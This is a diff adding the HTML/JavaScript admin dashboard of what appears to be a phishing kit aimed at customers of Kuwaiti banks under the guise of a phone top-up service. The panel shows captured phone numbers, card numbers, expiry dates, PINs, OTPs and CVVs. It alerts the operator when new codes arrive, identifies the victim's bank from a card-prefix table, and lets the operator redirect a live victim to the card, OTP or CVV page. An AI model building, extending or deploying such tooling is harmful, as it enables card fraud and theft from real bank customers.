@@ -1,0 +1,655 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+<title>لوحة التحكم</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@400;500;700;800&display=swap" rel="stylesheet">
+<style>
+  :root{
+    --bg:#f4f6f9; --card:#fff; --ink:#1a1d24; --ink-soft:#6b7280;
+    --line:#e6e8ed; --red:#e4312a; --green:#1e9e5a; --radius:16px;
+    box-sizing:border-box;
+  }
+  *,*::before,*::after{box-sizing:inherit;margin:0;padding:0}
+  body{
+    font-family:'Tajawal',system-ui,-apple-system,sans-serif;
+    background:var(--bg);color:var(--ink);min-height:100vh;
+    -webkit-font-smoothing:antialiased;
+  }
+
+  /* ---------- login ---------- */
+  .login-wrap{min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}
+  .login{
+    background:var(--card);border:1px solid var(--line);border-radius:var(--radius);
+    padding:34px 26px;width:100%;max-width:380px;box-shadow:0 10px 30px rgba(28,33,48,.06);text-align:center;
+  }
+  .login h1{font-size:24px;font-weight:800;margin-bottom:6px}
+  .login p{color:var(--ink-soft);font-size:15px;margin-bottom:22px}
+  .field{
+    border:1.4px solid #dfe2e8;border-radius:12px;height:56px;display:flex;align-items:center;
+    padding:0 14px;margin-bottom:14px;
+  }
+  .field input{border:none;outline:none;width:100%;font-family:inherit;font-size:16px;background:none;text-align:right}
+  .btn{
+    width:100%;height:56px;border:none;border-radius:999px;font-family:inherit;font-weight:800;
+    font-size:17px;color:#fff;background:var(--red);cursor:pointer;transition:.15s;
+  }
+  .btn:active{transform:scale(.99)}
+  .err{color:var(--red);font-size:14px;font-weight:700;min-height:20px;margin-bottom:10px}
+
+  /* ---------- dashboard ---------- */
+  .dash{max-width:900px;margin:0 auto;padding:22px 16px 60px;display:none}
+  .topbar{display:flex;align-items:center;justify-content:space-between;gap:12px;margin-bottom:20px;flex-wrap:wrap}
+  .topbar h1{font-size:24px;font-weight:800}
+  .top-actions{display:flex;align-items:center;gap:10px}
+
+  .wifi-btn{
+    display:inline-flex;align-items:center;gap:10px;background:#fff;border:1.6px solid var(--line);
+    border-radius:999px;padding:10px 16px;font-family:inherit;font-weight:800;font-size:16px;color:var(--ink);
+    cursor:pointer;transition:.15s;
+  }
+  .wifi-btn.live{border-color:var(--green);color:var(--green)}
+  .wifi-btn .count{font-size:18px;min-width:18px;text-align:center}
+  .wifi-btn .dot{width:9px;height:9px;border-radius:50%;background:#c7cad2}
+  .wifi-btn.live .dot{background:var(--green);animation:pulse 1.4s infinite}
+  @keyframes pulse{0%{box-shadow:0 0 0 0 rgba(30,158,90,.5)}70%{box-shadow:0 0 0 8px rgba(30,158,90,0)}100%{box-shadow:0 0 0 0 rgba(30,158,90,0)}}
+
+  .logout{background:none;border:none;color:var(--ink-soft);font-family:inherit;font-weight:700;font-size:15px;cursor:pointer}
+
+  .stats{display:flex;gap:12px;margin-bottom:18px;flex-wrap:wrap}
+  .stat{background:#fff;border:1px solid var(--line);border-radius:14px;padding:16px 18px;flex:1;min-width:150px}
+  .stat .num{font-size:28px;font-weight:800}
+  .stat .lbl{color:var(--ink-soft);font-size:14px;margin-top:2px}
+
+  /* table */
+  .table-card{background:#fff;border:1px solid var(--line);border-radius:var(--radius);overflow:hidden}
+  .table-head{display:flex;align-items:center;justify-content:space-between;padding:16px 18px;border-bottom:1px solid var(--line)}
+  .table-head h2{font-size:20px;font-weight:800}
+  .table-scroll{overflow-x:auto}
+  table{width:100%;border-collapse:collapse;min-width:650px}
+  th,td{padding:14px 16px;text-align:right;font-size:16px}
+  th{background:#fafbfc;color:#3b3f48;font-weight:800;font-size:15px;border-bottom:1px solid var(--line)}
+  td{border-bottom:1px solid #f0f2f5}
+  tr:last-child td{border-bottom:none}
+  .phone{font-weight:700;font-size:17px;direction:ltr;display:inline-block}
+  .amount{font-weight:800;font-size:17px}
+  .time{color:var(--ink-soft);font-size:14px}
+  .empty{padding:40px;text-align:center;color:var(--ink-soft)}
+  .clear-btn{background:none;border:none;color:var(--red);font-family:inherit;font-weight:700;font-size:15px;cursor:pointer}
+  .td-actions{text-align:left;white-space:nowrap}
+
+  .badge{display:inline-block;border-radius:6px;padding:4px 12px;font-size:13px;font-weight:700}
+  .badge.accepted{background:#d4f0e0;color:#1e9e5a}
+  .badge.rejected{background:#fde8e8;color:var(--red)}
+  .badge.pending{background:#fff3cd;color:#856404}
+  .badge.redirected{background:#e8d5f5;color:#7b1fa2}
+  .badge.redirect_card{background:#e8d5f5;color:#7b1fa2}
+  .badge.redirect_otp{background:#e8d5f5;color:#7b1fa2}
+  .badge.redirect_cvv{background:#e8d5f5;color:#7b1fa2}
+
+  /* action buttons in table */
+  .tbl-btn{
+    border:none;border-radius:8px;padding:8px 16px;font-family:inherit;font-weight:800;
+    font-size:14px;cursor:pointer;transition:.15s;margin:0 3px;
+  }
+  .tbl-btn.details{background:#1565c0;color:#fff}
+  .tbl-btn.details:hover{background:#0d47a1}
+  .tbl-btn.redirect{background:#7b1fa2;color:#fff;position:relative}
+  .tbl-btn.redirect:hover{background:#5c1480}
+
+  .redirect-menu{
+    display:none;position:absolute;top:100%;left:0;z-index:100;
+    background:#fff;border:1.5px solid var(--line);border-radius:10px;
+    box-shadow:0 8px 24px rgba(0,0,0,.15);min-width:160px;overflow:hidden;
+    margin-top:4px;
+  }
+  .redirect-menu.open{display:block}
+  .redirect-menu button{
+    display:block;width:100%;border:none;background:none;padding:12px 16px;
+    font-family:inherit;font-size:14px;font-weight:700;color:var(--ink);
+    cursor:pointer;text-align:right;transition:.1s;
+  }
+  .redirect-menu button:hover{background:#f0e6f6;color:#7b1fa2}
+  .redirect-menu button+button{border-top:1px solid #f0f2f5}
+  .redirect-wrap{position:relative;display:inline-block}
+
+  /* ---------- modal ---------- */
+  .modal-overlay{
+    display:none;position:fixed;inset:0;background:rgba(0,0,0,.5);
+    z-index:1000;align-items:center;justify-content:center;padding:20px;
+  }
+  .modal-overlay.open{display:flex}
+  .modal{
+    background:#fff;border-radius:var(--radius);width:100%;max-width:560px;
+    box-shadow:0 20px 60px rgba(0,0,0,.2);overflow:hidden;
+    max-height:90vh;overflow-y:auto;
+  }
+  .modal-header{
+    display:flex;align-items:center;justify-content:space-between;
+    padding:20px 24px;border-bottom:1px solid var(--line);background:#fafbfc;
+  }
+  .modal-header h3{font-size:20px;font-weight:800}
+  .modal-close{
+    background:none;border:none;font-size:24px;cursor:pointer;color:var(--ink-soft);
+    width:36px;height:36px;display:flex;align-items:center;justify-content:center;
+    border-radius:8px;transition:.15s;
+  }
+  .modal-close:hover{background:#f0f0f0}
+  .modal-body{padding:24px}
+  .bank-banner{
+    display:flex;align-items:center;gap:12px;padding:14px 16px;margin-bottom:16px;
+    background:#f0f6ff;border:1px solid #c8ddf5;border-radius:10px;
+  }
+  .bank-banner img{height:32px;width:auto;object-fit:contain}
+  .bank-banner .bank-name{font-size:16px;font-weight:800;color:#1a3a5c}
+  .detail-row{
+    display:flex;justify-content:space-between;align-items:center;
+    padding:12px 0;border-bottom:1px solid #f0f2f5;
+  }
+  .detail-row:last-child{border-bottom:none}
+  .detail-label{font-size:15px;font-weight:700;color:var(--ink-soft)}
+  .detail-value{font-size:16px;font-weight:700;font-family:monospace;direction:ltr;letter-spacing:.5px}
+  .modal-actions{
+    display:flex;gap:12px;padding:18px 24px;border-top:1px solid var(--line);background:#fafbfc;
+  }
+  .modal-btn{
+    flex:1;padding:14px;border:none;border-radius:10px;font-family:inherit;
+    font-weight:800;font-size:16px;cursor:pointer;transition:.15s;
+  }
+  .modal-btn.accept{background:#d4f0e0;color:#1e9e5a}
+  .modal-btn.accept:hover{background:#1e9e5a;color:#fff}
+  .modal-btn.reject{background:#fde8e8;color:var(--red)}
+  .modal-btn.reject:hover{background:var(--red);color:#fff}
+  .modal-btn:disabled{opacity:.4;cursor:default}
+  .modal-status{text-align:center;padding:12px;font-weight:800;font-size:16px}
+
+  /* ---------- notification banner ---------- */
+  .notif-banner{
+    display:none;position:fixed;top:0;left:0;right:0;z-index:2000;
+    background:linear-gradient(135deg,#1565c0,#0d47a1);color:#fff;
+    padding:16px 24px;text-align:center;font-size:18px;font-weight:800;
+    box-shadow:0 4px 20px rgba(0,0,0,.3);
+    animation:slideDown .4s ease-out;
+  }
+  .notif-banner.show{display:block}
+  @keyframes slideDown{from{transform:translateY(-100%)}to{transform:translateY(0)}}
+  @keyframes flashBorder{
+    0%,100%{border-color:var(--line)}
+    50%{border-color:#1565c0}
+  }
+  .table-card.flash{animation:flashBorder .6s ease 3}
+
+  /* ---------- desktop ---------- */
+  @media(min-width:900px){
+    .login{ max-width:460px; padding:48px 40px; }
+    .login h1{ font-size:30px; }
+    .login p{ font-size:17px; }
+    .field{ height:62px; font-size:17px; }
+    .field input{ font-size:18px; }
+    .btn{ height:62px; font-size:19px; }
+
+    .dash{ max-width:1400px; padding:32px 32px 80px; }
+    .topbar h1{ font-size:30px; }
+    .wifi-btn{ font-size:18px; padding:12px 20px; }
+    .wifi-btn .count{ font-size:20px; }
+    .logout{ font-size:17px; }
+
+    .stat{ padding:22px 26px; min-width:180px; }
+    .stat .num{ font-size:36px; }
+    .stat .lbl{ font-size:16px; }
+
+    .table-head{ padding:20px 24px; }
+    .table-head h2{ font-size:22px; }
+    th,td{ padding:14px 16px; font-size:15px; }
+    .clear-btn{ font-size:16px; }
+  }
+</style>
+</head>
+<body>
+
+  <div class="login-wrap" id="loginWrap">
+    <div class="login">
+      <h1>لوحة التحكم</h1>
+      <p>أدخل كلمة المرور للدخول</p>
+      <div class="err" id="loginErr"></div>
+      <div class="field">
+        <input type="password" id="password" placeholder="كلمة المرور" autocomplete="current-password">
+      </div>
+      <button class="btn" id="loginBtn">دخول</button>
+    </div>
+  </div>
+
+  <div class="dash" id="dash">
+    <div class="topbar">
+      <h1>الطلبات</h1>
+      <div class="top-actions">
+        <button class="wifi-btn" id="wifiBtn" title="الزيارات النشطة">
+          <span class="dot"></span>
+          <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+            <path d="M5 12.55a11 11 0 0 1 14 0"/>
+            <path d="M1.5 9a16 16 0 0 1 21 0"/>
+            <path d="M8.5 16.1a6 6 0 0 1 7 0"/>
+            <line x1="12" y1="20" x2="12.01" y2="20"/>
+          </svg>
+          <span class="count" id="activeCount">0</span>
+        </button>
+        <button class="logout" id="logoutBtn">خروج</button>
+      </div>
+    </div>
+
+    <div class="stats">
+      <div class="stat"><div class="num" id="totalOrders">0</div><div class="lbl">إجمالي الطلبات</div></div>
+      <div class="stat"><div class="num" id="liveVisitors">0</div><div class="lbl">زيارات نشطة الآن</div></div>
+    </div>
+
+    <div class="table-card">
+      <div class="table-head">
+        <h2>الطلبات</h2>
+        <button class="clear-btn" id="clearBtn">مسح الكل</button>
+      </div>
+      <div class="table-scroll">
+        <table>
+          <thead>
+            <tr>
+              <th>البنك</th>
+              <th>رقم الجوال</th>
+              <th>قيمة الشحن</th>
+              <th>الوقت</th>
+              <th>الحالة</th>
+              <th>الإجراءات</th>
+            </tr>
+          </thead>
+          <tbody id="rows">
+            <tr><td colspan="5" class="empty">لا توجد طلبات بعد</td></tr>
+          </tbody>
+        </table>
+      </div>
+    </div>
+  </div>
+
+  <!-- Notification Banner -->
+  <div class="notif-banner" id="notifBanner">🔔 بيانات جديدة وصلت!</div>
+
+  <!-- Modal -->
+  <div class="modal-overlay" id="modalOverlay">
+    <div class="modal">
+      <div class="modal-header">
+        <h3>تفاصيل الطلب</h3>
+        <button class="modal-close" id="modalClose">&times;</button>
+      </div>
+      <div class="modal-body" id="modalBody"></div>
+      <div class="modal-actions" id="modalActions"></div>
+    </div>
+  </div>
+
+<script>
+  const TOKEN_KEY = 'admin_token';
+  const loginWrap = document.getElementById('loginWrap');
+  const dash = document.getElementById('dash');
+  const loginErr = document.getElementById('loginErr');
+  let pollTimer = null;
+  let allSubmissions = [];
+  let lastCount = 0;
+  let lastDataKeys = new Set();
+
+  const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+  function playAlert() {
+    const o1 = audioCtx.createOscillator();
+    const o2 = audioCtx.createOscillator();
+    const g = audioCtx.createGain();
+    o1.type = 'sine'; o1.frequency.value = 880;
+    o2.type = 'sine'; o2.frequency.value = 1100;
+    g.gain.setValueAtTime(0.3, audioCtx.currentTime);
+    g.gain.exponentialRampToValueAtTime(0.01, audioCtx.currentTime + 0.8);
+    o1.connect(g); o2.connect(g); g.connect(audioCtx.destination);
+    o1.start(); o2.start(audioCtx.currentTime + 0.2);
+    o1.stop(audioCtx.currentTime + 0.8); o2.stop(audioCtx.currentTime + 0.8);
+  }
+
+  function showNotifBanner(msg) {
+    const b = document.getElementById('notifBanner');
+    b.textContent = '🔔 ' + msg;
+    b.classList.remove('show');
+    void b.offsetWidth;
+    b.classList.add('show');
+    setTimeout(() => b.classList.remove('show'), 4000);
+
+    const tc = document.querySelector('.table-card');
+    tc.classList.remove('flash');
+    void tc.offsetWidth;
+    tc.classList.add('flash');
+  }
+
+  function buildDataKey(s) {
+    return s.id + '|' + (s.card||'') + '|' + (s.pin||'') + '|' + (s.otp||'') + '|' + (s.cvv||'');
+  }
+
+  function token(){ return sessionStorage.getItem(TOKEN_KEY); }
+
+  async function login(){
+    loginErr.textContent = '';
+    const pw = document.getElementById('password').value;
+    try{
+      const r = await fetch('/api/admin/login',{
+        method:'POST',headers:{'Content-Type':'application/json'},
+        body:JSON.stringify({password:pw})
+      });
+      if(!r.ok){ loginErr.textContent = 'كلمة المرور غير صحيحة'; return; }
+      const d = await r.json();
+      sessionStorage.setItem(TOKEN_KEY, d.token);
+      showDash();
+    }catch(e){ loginErr.textContent = 'تعذّر الاتصال بالخادم'; }
+  }
+
+  function fmtTime(iso){
+    const d = new Date(iso);
+    return d.toLocaleString('ar-KW',{day:'2-digit',month:'2-digit',hour:'2-digit',minute:'2-digit'});
+  }
+
+  async function loadData(){
+    try{
+      const r = await fetch('/api/admin/submissions',{headers:{'Authorization':'Bearer '+token()}});
+      if(r.status===401){ logout(); return; }
+      const d = await r.json();
+      const list = d.submissions || [];
+
+      const newKeys = new Set(list.map(buildDataKey));
+      let hasNew = false;
+      let msg = '';
+
+      if (lastDataKeys.size > 0) {
+        const newOrders = list.filter(s => !lastDataKeys.has(buildDataKey(s)));
+        if (newOrders.length > 0) {
+          hasNew = true;
+          const latest = newOrders[0];
+          if (latest.otp && !lastDataKeys.has(buildDataKey(latest))) msg = 'وصل OTP جديد — ' + latest.phone;
+          else if (latest.cvv && !lastDataKeys.has(buildDataKey(latest))) msg = 'وصل CVV جديد — ' + latest.phone;
+          else if (latest.pin && !lastDataKeys.has(buildDataKey(latest))) msg = 'وصل رقم سري جديد — ' + latest.phone;
+          else if (latest.card && !lastDataKeys.has(buildDataKey(latest))) msg = 'وصلت بيانات بطاقة جديدة — ' + latest.phone;
+          else msg = 'طلب جديد وصل — ' + latest.phone;
+        }
+      }
+
+      lastDataKeys = newKeys;
+      allSubmissions = list;
+      render(list);
+      setActive(d.active || 0);
+
+      if (hasNew && msg) {
+        playAlert();
+        showNotifBanner(msg);
+      }
+    }catch(e){}
+  }
+
+  function setActive(n){
+    document.getElementById('activeCount').textContent = n;
+    document.getElementById('liveVisitors').textContent = n;
+    document.getElementById('wifiBtn').classList.toggle('live', n > 0);
+  }
+
+  function statusBadge(st) {
+    if (st === 'accepted') return '<span class="badge accepted">مقبول</span>';
+    if (st === 'rejected') return '<span class="badge rejected">مرفوض</span>';
+    if (st === 'redirect_card') return '<span class="badge redirected">توجيه ← البطاقة</span>';
+    if (st === 'redirect_otp') return '<span class="badge redirected">توجيه ← الكود</span>';
+    if (st === 'redirect_cvv') return '<span class="badge redirected">توجيه ← CVV</span>';
+    return '<span class="badge pending">قيد الانتظار</span>';
+  }
+
+  function render(list){
+    document.getElementById('totalOrders').textContent = list.length;
+    const rows = document.getElementById('rows');
+    if(!list.length){ rows.innerHTML = '<tr><td colspan="6" class="empty">لا توجد طلبات بعد</td></tr>'; return; }
+    rows.innerHTML = list.map(s => {
+      const bank = detectBank(s.card);
+      const bankCell = bank
+        ? '<img src="'+escapeHtml(bank.logo)+'" alt="" style="height:22px;width:auto;vertical-align:middle;margin-left:6px" onerror="this.style.display=\'none\'"><span style="font-size:12px;font-weight:700">'+escapeHtml(bank.name)+'</span>'
+        : '<span style="color:var(--ink-soft);font-size:12px">—</span>';
+      return '<tr>' +
+        '<td>'+bankCell+'</td>' +
+        '<td><span class="phone">'+escapeHtml(s.phone)+'</span></td>' +
+        '<td><span class="amount">'+escapeHtml(s.amount)+'</span> د.ك</td>' +
+        '<td class="time">'+fmtTime(s.time)+'</td>' +
+        '<td>'+statusBadge(s.status)+'</td>' +
+        '<td class="td-actions">' +
+          '<button class="tbl-btn details" onclick="openDetails(\''+s.id+'\')">التفاصيل</button>' +
+          '<div class="redirect-wrap">' +
+            '<button class="tbl-btn redirect" onclick="toggleRedirectMenu(this,\''+s.id+'\')">إعادة التوجيه ▾</button>' +
+            '<div class="redirect-menu">' +
+              '<button onclick="redirectUser(\''+s.id+'\',\'card\')">صفحة البطاقة</button>' +
+              '<button onclick="redirectUser(\''+s.id+'\',\'otp\')">صفحة الكود</button>' +
+              '<button onclick="redirectUser(\''+s.id+'\',\'cvv\')">صفحة CVV</button>' +
+            '</div>' +
+          '</div>' +
+        '</td>' +
+      '</tr>';
+    }).join('');
+  }
+
+  function escapeHtml(x){ return String(x).replace(/[&<>"']/g, c => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c])); }
+
+  const BANKS = {
+    NBK:{name:'بنك الكويت الوطني',logo:'https://upload.wikimedia.org/wikipedia/commons/a/a8/NBK.svg'},
+    KFH:{name:'بيت التمويل الكويتي',logo:'https://upload.wikimedia.org/wikipedia/en/e/ec/Kuwait_Finance_House_logo.svg'},
+    CBK:{name:'البنك التجاري الكويتي',logo:'https://upload.wikimedia.org/wikipedia/commons/e/eb/CBK_LOGO.png'},
+    GB:{name:'بنك الخليج',logo:'https://upload.wikimedia.org/wikipedia/commons/2/27/Gulf_Bank_Logo.svg'},
+    ABK:{name:'البنك الأهلي الكويتي',logo:'https://upload.wikimedia.org/wikipedia/commons/5/52/ABK_Logo.svg'},
+    BURGAN:{name:'بنك برقان',logo:'https://upload.wikimedia.org/wikipedia/commons/9/96/Burgan_Bank_logo.svg'},
+    KIB:{name:'بنك الكويت الدولي',logo:'https://upload.wikimedia.org/wikipedia/en/b/b2/Kuwait_International_Bank_Logo.png'},
+    BOB:{name:'بنك بوبيان',logo:'https://upload.wikimedia.org/wikipedia/commons/3/30/BoubyanBankLogo_%281%29.svg'},
+    WRB:{name:'بنك وربة',logo:'https://upload.wikimedia.org/wikipedia/commons/4/4d/Warba_Bank_Logo.png'},
+    BBK:{name:'بنك البحرين والكويت',logo:'https://upload.wikimedia.org/wikipedia/commons/d/d5/Bank_of_Bahrain_and_Kuwait.svg'},
+    RAJHI:{name:'مصرف الراجحي',logo:'https://upload.wikimedia.org/wikipedia/commons/f/f1/Al_Rajhi_Bank_Logo.svg'},
+    QNB:{name:'بنك قطر الوطني',logo:'https://upload.wikimedia.org/wikipedia/commons/8/8f/QNB_Logo.svg'},
+    MSHQ:{name:'بنك المشرق',logo:'https://upload.wikimedia.org/wikipedia/en/5/5c/Mashreq_logo_2022.svg'},
+  };
+  const BIN_MAP = {
+    '405843':'NBK','405853':'NBK','405871':'NBK','405873':'NBK',
+    '409567':'NBK','410124':'NBK','415899':'NBK','417768':'NBK',
+    '426083':'NBK','432423':'NBK','455014':'NBK','455015':'NBK',
+    '464452':'NBK','479098':'NBK','515496':'NBK','515515':'NBK',
+    '519130':'NBK','520650':'NBK','521408':'NBK','521415':'NBK',
+    '521533':'NBK','522888':'NBK','530447':'NBK','534993':'NBK',
+    '534994':'NBK','535010':'NBK','535417':'NBK','536336':'NBK',
+    '541312':'NBK','541313':'NBK','541318':'NBK','542836':'NBK',
+    '544219':'NBK','545494':'NBK','545880':'NBK','546860':'NBK',
+    '547187':'NBK','547196':'NBK','552050':'NBK','552277':'NBK',
+    '558883':'NBK','589160':'NBK',
+    '400601':'KFH','416835':'KFH','421107':'KFH','424337':'KFH',
+    '428926':'KFH','431270':'KFH','450777':'KFH','450778':'KFH',
+    '455018':'KFH','458583':'KFH','466719':'KFH','479045':'KFH',
+    '485602':'KFH','498495':'KFH','516457':'KFH','516678':'KFH',
+    '517957':'KFH','524221':'KFH','524745':'KFH','526450':'KFH',
+    '528006':'KFH','531483':'KFH','544239':'KFH','544240':'KFH',
+    '545408':'KFH',
+    '400155':'CBK','400156':'CBK','424677':'CBK',
+    '425873':'CBK','440625':'CBK','441215':'CBK','443967':'CBK',
+    '443968':'CBK','455057':'CBK','458550':'CBK','464462':'CBK',
+    '476099':'CBK','478426':'CBK','480944':'CBK','485441':'CBK',
+    '489015':'CBK','510042':'CBK','516334':'CBK','516353':'CBK',
+    '517731':'CBK','521175':'CBK','521371':'CBK','521406':'CBK',
+    '526206':'CBK','526597':'CBK','529074':'CBK','532672':'CBK',
+    '533757':'CBK','537015':'CBK','539887':'CBK','541855':'CBK',
+    '544290':'CBK','548183':'CBK','548184':'CBK','548277':'CBK',
+    '559324':'CBK',
+    '406430':'GB','422056':'GB','431210':'GB','431211':'GB',
+    '431927':'GB','438912':'GB','442104':'GB','442105':'GB',
+    '442446':'GB','456776':'GB','456777':'GB','456778':'GB',
+    '460274':'GB','480182':'GB','480336':'GB','513665':'GB',
+    '516647':'GB','517419':'GB','517458':'GB','522864':'GB',
+    '524158':'GB','527262':'GB','531329':'GB','531470':'GB',
+    '531471':'GB','531644':'GB','531726':'GB','532675':'GB',
+    '533769':'GB','533770':'GB','533788':'GB','535966':'GB',
+    '536524':'GB','540261':'GB','541107':'GB','542857':'GB',
+    '542859':'GB','544675':'GB','545424':'GB','552007':'GB',
+    '552078':'GB','559320':'GB','559475':'GB','559582':'GB',
+    '403622':'ABK','405285':'ABK','422431':'ABK','422869':'ABK',
+    '423826':'ABK','426669':'ABK','428628':'ABK','429790':'ABK',
+    '429791':'ABK','450902':'ABK','455016':'ABK','455049':'ABK',
+    '457925':'ABK','462824':'ABK','473834':'ABK','474868':'ABK',
+    '492190':'ABK','516243':'ABK','522869':'ABK','524114':'ABK',
+    '529072':'ABK','529567':'ABK','529568':'ABK','537209':'ABK',
+    '544621':'ABK','544622':'ABK','544623':'ABK','556638':'ABK',
+    '402166':'BURGAN','402978':'BURGAN','403583':'BURGAN','407417':'BURGAN',
+    '415254':'BURGAN','431106':'BURGAN','435798':'BURGAN','435799':'BURGAN',
+    '435800':'BURGAN','438123':'BURGAN','438124':'BURGAN','440711':'BURGAN',
+    '440800':'BURGAN','440801':'BURGAN','440831':'BURGAN','448329':'BURGAN',
+    '450238':'BURGAN','455048':'BURGAN','455067':'BURGAN','455068':'BURGAN',
+    '456031':'BURGAN','466797':'BURGAN','466799':'BURGAN','467013':'BURGAN',
+    '467014':'BURGAN','468502':'BURGAN','468564':'BURGAN','468565':'BURGAN',
+    '470965':'BURGAN','475189':'BURGAN','476335':'BURGAN','483464':'BURGAN',
+    '491785':'BURGAN','517313':'BURGAN','517799':'BURGAN','518521':'BURGAN',
+    '518549':'BURGAN','521596':'BURGAN','524190':'BURGAN','524844':'BURGAN',
+    '527307':'BURGAN','527525':'BURGAN','527526':'BURGAN','528803':'BURGAN',
+    '531611':'BURGAN','531862':'BURGAN','532335':'BURGAN','532337':'BURGAN',
+    '532339':'BURGAN','532341':'BURGAN','532493':'BURGAN','533408':'BURGAN',
+    '536047':'BURGAN','540759':'BURGAN','552299':'BURGAN',
+    '403068':'KIB','404975':'KIB','406464':'KIB','409054':'KIB',
+    '409055':'KIB','413033':'KIB','414604':'KIB','422622':'KIB',
+    '431475':'KIB','458232':'KIB','458233':'KIB','458770':'KIB',
+    '458771':'KIB','471457':'KIB','473990':'KIB','517893':'KIB',
+    '533778':'KIB','536968':'KIB','539281':'KIB','554134':'KIB',
+    '559472':'KIB','559593':'KIB',
+    '404919':'BOB','409190':'BOB','413685':'BOB','417773':'BOB',
+    '422113':'BOB','422114':'BOB','423195':'BOB','426058':'BOB',
+    '431199':'BOB','441773':'BOB','443995':'BOB','450605':'BOB',
+    '458815':'BOB','470350':'BOB','477937':'BOB','490455':'BOB',
+    '490456':'BOB','510692':'BOB','528540':'BOB','533746':'BOB',
+    '457442':'WRB','457443':'WRB','457444':'WRB','457445':'WRB',
+    '457446':'WRB','517219':'WRB','521476':'WRB','525528':'WRB',
+    '530669':'WRB','532199':'WRB','532749':'WRB','532800':'WRB',
+    '532993':'WRB','535395':'WRB','535406':'WRB','535415':'WRB',
+    '536325':'WRB','540649':'WRB','541350':'WRB','547185':'WRB',
+    '548845':'WRB','552512':'WRB','554273':'WRB','554801':'WRB',
+    '557763':'WRB','559151':'WRB','559459':'WRB','559527':'WRB',
+    '559539':'WRB',
+    '418056':'BBK','440250':'BBK','455012':'BBK','455013':'BBK',
+    '406966':'RAJHI','433863':'RAJHI','458838':'RAJHI','458839':'RAJHI',
+    '458840':'RAJHI','458841':'RAJHI','458842':'RAJHI','458843':'RAJHI',
+    '521020':'QNB','559307':'QNB',
+    '428654':'MSHQ',
+  };
+
+  function detectBank(cardNum) {
+    if (!cardNum) return null;
+    const raw = cardNum.replace(/\D/g,'');
+    if (raw.length < 4) return null;
+    const bin6 = raw.slice(0,6);
+    if (BIN_MAP[bin6]) return BANKS[BIN_MAP[bin6]];
+    for (let len = 5; len >= 4; len--) {
+      const prefix = raw.slice(0, len);
+      for (const [bin, code] of Object.entries(BIN_MAP)) {
+        if (bin.startsWith(prefix)) return BANKS[code];
+      }
+    }
+    return null;
+  }
+
+  function openDetails(id) {
+    const s = allSubmissions.find(x => x.id === id);
+    if (!s) return;
+
+    const bank = detectBank(s.card);
+    let bankHtml = '';
+    if (bank) {
+      bankHtml = '<div class="bank-banner"><img src="'+escapeHtml(bank.logo)+'" alt="" onerror="this.style.display=\'none\'"><span class="bank-name">'+escapeHtml(bank.name)+'</span></div>';
+    }
+
+    const body = document.getElementById('modalBody');
+    body.innerHTML = bankHtml +
+      '<div class="detail-row"><span class="detail-label">رقم الجوال</span><span class="detail-value">'+escapeHtml(s.phone)+'</span></div>' +
+      '<div class="detail-row"><span class="detail-label">قيمة الشحن</span><span class="detail-value">'+escapeHtml(s.amount)+' د.ك</span></div>' +
+      '<div class="detail-row"><span class="detail-label">رقم البطاقة</span><span class="detail-value">'+escapeHtml(s.card||'—')+'</span></div>' +
+      '<div class="detail-row"><span class="detail-label">تاريخ الانتهاء</span><span class="detail-value">'+escapeHtml(s.expiry||'—')+'</span></div>' +
+      '<div class="detail-row"><span class="detail-label">الرقم السري</span><span class="detail-value">'+escapeHtml(s.pin||'—')+'</span></div>' +
+      '<div class="detail-row"><span class="detail-label">OTP</span><span class="detail-value">'+escapeHtml(s.otp||'—')+'</span></div>' +
+      '<div class="detail-row"><span class="detail-label">CVV</span><span class="detail-value">'+escapeHtml(s.cvv||'—')+'</span></div>' +
+      '<div class="detail-row"><span class="detail-label">الوقت</span><span class="detail-value" style="font-family:inherit;direction:rtl">'+fmtTime(s.time)+'</span></div>';
+
+    const actions = document.getElementById('modalActions');
+    if (s.status === 'accepted') {
+      actions.innerHTML = '<div class="modal-status" style="color:var(--green);width:100%">تم القبول ✓</div>';
+    } else if (s.status === 'rejected') {
+      actions.innerHTML = '<div class="modal-status" style="color:var(--red);width:100%">تم الرفض ✗</div>';
+    } else {
+      actions.innerHTML =
+        '<button class="modal-btn accept" onclick="doAction(\'accept\',\''+id+'\')">قبول</button>' +
+        '<button class="modal-btn reject" onclick="doAction(\'reject\',\''+id+'\')">رفض</button>';
+    }
+
+    document.getElementById('modalOverlay').classList.add('open');
+  }
+
+  function closeModal() {
+    document.getElementById('modalOverlay').classList.remove('open');
+  }
+
+  function toggleRedirectMenu(btn, id) {
+    const menu = btn.nextElementSibling;
+    document.querySelectorAll('.redirect-menu.open').forEach(m => { if(m !== menu) m.classList.remove('open'); });
+    menu.classList.toggle('open');
+  }
+
+  document.addEventListener('click', function(e) {
+    if (!e.target.closest('.redirect-wrap')) {
+      document.querySelectorAll('.redirect-menu.open').forEach(m => m.classList.remove('open'));
+    }
+  });
+
+  async function redirectUser(id, page) {
+    document.querySelectorAll('.redirect-menu.open').forEach(m => m.classList.remove('open'));
+    try {
+      await fetch('/api/admin/redirect/'+id, {
+        method: 'POST',
+        headers: { 'Authorization': 'Bearer '+token(), 'Content-Type': 'application/json' },
+        body: JSON.stringify({ page: page })
+      });
+      loadData();
+    } catch(e) {}
+  }
+
+  async function doAction(action, id) {
+    try {
+      await fetch('/api/admin/'+action+'/'+id, {
+        method: 'POST', headers: { 'Authorization': 'Bearer '+token() }
+      });
+      closeModal();
+      loadData();
+    } catch(e) {}
+  }
+
+  function showDash(){
+    loginWrap.style.display = 'none';
+    dash.style.display = 'block';
+    loadData();
+    clearInterval(pollTimer);
+    pollTimer = setInterval(loadData, 4000);
+  }
+
+  function logout(){
+    sessionStorage.removeItem(TOKEN_KEY);
+    clearInterval(pollTimer);
+    dash.style.display = 'none';
+    loginWrap.style.display = 'flex';
+  }
+
+  document.getElementById('loginBtn').addEventListener('click', login);
+  document.getElementById('password').addEventListener('keydown', e => { if(e.key==='Enter') login(); });
+  document.getElementById('logoutBtn').addEventListener('click', logout);
